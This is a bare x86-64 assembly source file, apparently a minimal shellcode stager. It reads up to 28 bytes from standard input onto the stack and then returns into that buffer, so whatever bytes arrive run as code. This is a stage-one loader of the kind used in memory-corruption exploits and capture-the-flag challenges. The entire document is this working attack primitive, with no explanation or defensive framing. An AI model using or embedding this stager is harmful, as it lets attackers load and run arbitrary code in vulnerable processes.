.text
.global _start

_start:
	push %rax
	mov %rsp,%rsi
	xor %rdi,%rdi
	mov $28,%dl
	syscall
	push %rsi
	ret	
